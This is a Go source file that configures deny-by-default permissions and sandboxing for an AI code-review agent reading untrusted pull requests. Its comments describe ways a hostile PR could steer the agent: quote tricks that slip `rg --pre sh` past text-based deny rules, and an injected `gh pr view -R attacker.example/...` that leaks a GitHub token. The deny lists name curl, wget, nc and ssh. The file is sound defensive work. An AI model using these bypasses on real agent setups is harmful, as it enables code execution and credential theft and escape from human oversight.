package pr

import (
	"errors"
	"fmt"
	"strconv"
)

// reviewSettings is the whole Claude Code settings document the clean-room
// reviewer (agent A) runs under, passed as inline JSON with --settings
// (reviewSettingsJSON). It is DENY-BY-DEFAULT: the agent may only read and
// run the listed inspection commands. It has NO permission to post a review,
// comment, merge, or push — posting is gated exclusively by forgectl's human
// approval gate, never by the agent itself.
//
// It is never written into the workspace. The workspace holds the PR head,
// which can commit a `.claude/` of its own, and Claude Code merges settings
// arrays from every source it loads. So the reviewer loads NO settings file
// at all (--setting-sources with an empty value) and this document is its
// only configuration; see reviewSettingSources.
type reviewSettings struct {
	Permissions permissions `json:"permissions"`
	// Sandbox is the OS sandbox the reviewer's Bash commands run under
	// (reviewsandbox.go).
	Sandbox sandboxSettings `json:"sandbox"`
	// DisableAllHooks is a backstop: with no settings file loaded there are
	// no user, project, or local hooks to run, and this also turns off plugin
	// hooks. Managed hooks are outside any non-managed setting's reach.
	DisableAllHooks bool `json:"disableAllHooks"`
}

type permissions struct {
	// DefaultMode "plan" keeps the agent from editing or running unlisted
	// commands without an explicit prompt — the deny-by-default floor.
	DefaultMode string   `json:"defaultMode"`
	Allow       []string `json:"allow"`
	Deny        []string `json:"deny"`
}

// baseReadOnly is the inspection surface both review modes share: the read
// tools and a handful of git/file commands chosen for reading. Kept as a
// single shared slice so the two modes' genuinely common surface cannot drift
// out of sync.
//
// It is NOT a proof that each entry is read-only. A Bash rule is a prefix
// over command text, and it admits every flag the command takes. Some of
// those flags write (`git log` alone accepts an output-file flag, which
// Claude Code's redirect check does not treat as a redirect), and git runs
// commands its configuration names. An allowed command can therefore do more
// than read, and no deny rule over the text can enumerate that away
// (forgectl#694). Treat this list as what the reviewer may ASK to run. What
// a run can then do is narrowed by the OS sandbox (reviewsandbox.go), and
// only as far as that file says: its writes are denied in the workspace and
// the shared git dir but still land in the findings dir and the per-user
// temp dir, its network is limited to the PR's gh hosts, and its READS are
// not narrowed at all.
//
// Neither mode grants `rg`. ripgrep's `--pre COMMAND` runs COMMAND on every
// searched file, so `rg --pre sh x file` executes a script straight out of a
// hostile PR head, and that command reaches the network with the window's
// environment, whatever the gh rules say. A deny rule cannot close it: Claude
// Code matches Bash rules against the command TEXT, and the shell removes
// quotes after that, so `rg --"pre"=sh x file` and `rg --p"r"e sh x file`
// carry no `--pre` substring yet still run the preprocessor (both measured on
// ripgrep 14.1.0). `-z/--search-zip` also spawns subprocesses: a fixed set of
// decompressors (gzip, bzip2, xz, lz4, brotli, zstd), each resolved on PATH. The built-in Grep tool covers
// search without a subprocess the agent can steer. PR mode used to accept rg
// behind PostReview's approval gate, but that gate bounds posting, not what a
// command does while it runs (forgectl#673).
var baseReadOnly = []string{
	"Read",
	"Grep",
	"Glob",
	"Bash(git diff:*)",
	"Bash(git log:*)",
	"Bash(git show:*)",
	"Bash(git status:*)",
	"Bash(git blame:*)",
	"Bash(cat:*)",
}

// allowReadOnly is the static part of a PR-mode review's permitted actions:
// exactly baseReadOnly (no rg — see baseReadOnly's doc). The gh reads are NOT
// here: prGhReadRules generates them per session, naming the PR's own number,
// host, and base repository (forgectl#673).
var allowReadOnly = append([]string{}, baseReadOnly...)

// prGhReadCommands are the only gh invocations a PR-mode review agent may run,
// spelled exactly as the agent must type them. Each names the PR by number and
// the BASE repository by HOST/OWNER/REPO, so the agent reads the PR it was
// asked to review rather than whatever an argument-less `gh pr view` resolves
// from the workspace clone, which is the head repository and may be a fork.
//
// They are exact commands, not prefixes, because a prefix cannot hold. The
// former `Bash(gh pr view:*)` admitted any trailing text, so an injected
// `gh pr view -R attacker.example/o/r 1` — or `gh pr view 1 --repo H/O/R
// -R attacker.example/o/r`, since gh takes the last --repo given — sent gh,
// and any ambient GH_ENTERPRISE_TOKEN, to a host nobody chose. A deny rule for
// `-R` cannot close that either: pflag accepts combined short flags
// (`-cRattacker.example/o/r`), and a PR URL operand selects a host with no
// flag at all. Claude Code matches a Bash rule with no `*` as one exact
// command, so each entry here admits nothing but itself; a compound command is
// split first, so `<entry> | head` still matches on the gh half.
//
// The caller guarantees host, owner, and repo are charset-validated
// (ValidHostSegment, ValidOwnerRepoPart); prGhReadRules checks it.
func prGhReadCommands(host string, ref Ref) []string {
	target := strconv.Itoa(ref.Number) + " --repo " + host + "/" + ref.Owner + "/" + ref.Repo
	return []string{
		"gh pr view " + target,
		"gh pr view " + target + " --comments",
		"gh pr diff " + target,
		"gh pr diff " + target + " --name-only",
		"gh pr checks " + target,
	}
}

// prGhReadRules renders prGhReadCommands as exact-match Bash allow rules. It
// refuses a value outside the host and owner/repo charsets: those exclude
// space, `*`, and `)`, the characters that would widen or break a rule, so a
// value that passed them cannot turn an exact rule into a pattern.
func prGhReadRules(host string, ref Ref) ([]string, error) {
	if !ValidHostSegment(host) || !ValidOwnerRepoPart(ref.Owner) || !ValidOwnerRepoPart(ref.Repo) || ref.Number <= 0 {
		return nil, errors.New("refusing to write the review allow-list: the PR's host, owner, repo, or number failed validation")
	}
	cmds := prGhReadCommands(host, ref)
	rules := make([]string, 0, len(cmds))
	for _, cmd := range cmds {
		rules = append(rules, "Bash("+cmd+")")
	}
	return rules, nil
}

// denyPosting is a best-effort defense-in-depth backstop, NOT the authoritative
// gate. PR mode cannot blanket-deny `gh` (it must allow the prGhReadRules reads,
// and Deny takes precedence over Allow, so a `Bash(gh:*)` deny would clobber
// those reads), so allowReadOnly — the deny-by-default allow-list — is what
// actually confines the agent to read-only actions. This enumerated deny list
// exists so that even if the DefaultMode "plan" floor is relaxed, the most
// dangerous mutating/stateful surfaces stay hard-blocked: the posting `gh pr`
// verbs, raw `gh api`, the mutating gh command groups enumerated below, git
// push, git commit, arbitrary URL fetches, and the file/notebook write tools.
// Completeness is deliberately NOT the claim — an enumeration can't cover every
// gh subcommand without a blanket `gh:*` deny that would break the allowed
// reads; the allow-list is the real gate. Deny takes precedence over allow in
// Claude Code's permission model, so each entry is a hard block; none overlaps
// allowReadOnly, so no read is affected.
var denyPosting = []string{
	"Bash(gh pr review:*)",
	"Bash(gh pr comment:*)",
	"Bash(gh pr merge:*)",
	"Bash(gh pr close:*)",
	"Bash(gh pr edit:*)",
	"Bash(gh pr ready:*)",
	"Bash(gh pr reopen:*)",
	"Bash(gh pr lock:*)",
	"Bash(gh pr unlock:*)",
	"Bash(gh api:*)",
	"Bash(gh workflow:*)",
	"Bash(gh release:*)",
	"Bash(gh secret:*)",
	"Bash(gh variable:*)",
	"Bash(gh ruleset:*)",
	"Bash(gh issue:*)",
	"Bash(gh gist:*)",
	"Bash(gh repo:*)",
	"Bash(gh run:*)",
	"Bash(gh auth:*)",
	"Bash(gh config:*)",
	"Bash(gh label:*)",
	"Bash(gh project:*)",
	"Bash(gh cache:*)",
	"Bash(gh codespace:*)",
	"Bash(gh extension:*)",
	"Bash(gh alias:*)",
	"Bash(git push:*)",
	"Bash(git commit:*)",
	"Bash(curl:*)",
	"Bash(wget:*)",
	"Write",
	"Edit",
	"MultiEdit",
	"NotebookEdit",
	"WebFetch",
}

// remoteProfile builds the deny-by-default permission set for a PR review:
// allowReadOnly plus the gh reads generated for this PR's own host and number
// (prGhReadRules), which it refuses to build from an unvalidated value.
func remoteProfile(host string, ref Ref) (permissions, error) {
	ghReads, err := prGhReadRules(host, ref)
	if err != nil {
		return permissions{}, err
	}
	return permissions{
		DefaultMode: "plan",
		Allow:       append(append([]string{}, allowReadOnly...), ghReads...),
		Deny:        denyPosting,
	}, nil
}

// localAllowReadOnly is the local session's permitted-action set: the same
// entries as baseReadOnly, copied rather than aliased — a bare slice-header
// assignment here would share baseReadOnly's backing array, so an in-place
// mutation of either slice (e.g. index-assignment) would silently corrupt the
// other, defeating the point of the two having independent names. Like
// allowReadOnly it grants no rg (see baseReadOnly's doc); unlike PR mode it
// gets no generated gh reads either — local mode permits no GitHub
// round-trip, not even a read-only one.
var localAllowReadOnly = append([]string{}, baseReadOnly...)

// localDenyNetwork is deliberately broader than denyPosting: it denies every
// gh subcommand (not just the posting ones) and every network-reaching git
// verb (fetch/pull/clone/remote/submodule), not just push — the literal "no
// network CLI" requirement for an offline review, applied as defense-in-depth
// on top of DefaultMode "plan" already blocking anything unlisted.
//
// Deliberately no bare "Write" here: Deny takes precedence over Allow, so a
// blanket Write deny would clobber the scoped Write(findingsDir/**) grant
// localProfile adds to Allow. Write is handled entirely by scoping to the
// findings dir, not by omission-then-deny.
var localDenyNetwork = []string{
	"Bash(gh:*)",
	"Bash(git push:*)",
	"Bash(git fetch:*)",
	"Bash(git pull:*)",
	"Bash(git clone:*)",
	"Bash(git remote:*)",
	"Bash(git submodule:*)",
	"Bash(git commit:*)",
	"Bash(curl:*)",
	"Bash(wget:*)",
	"Bash(ssh:*)",
	"Bash(scp:*)",
	"Bash(nc:*)",
	"Edit",
	"MultiEdit",
	"NotebookEdit",
	"WebFetch",
}

// localProfile builds the deny-by-default permission set for a local review
// session: baseReadOnly (no rg, no gh), plus exactly one scoped Write grant
// to findingsDir — the sole path outside the reviewed worktree the agent may
// write to.
func localProfile(findingsDir string) permissions {
	allow := append(append([]string{}, localAllowReadOnly...), fmt.Sprintf("Write(%s/**)", findingsDir))
	return permissions{
		DefaultMode: "plan",
		Allow:       allow,
		Deny:        localDenyNetwork,
	}
}
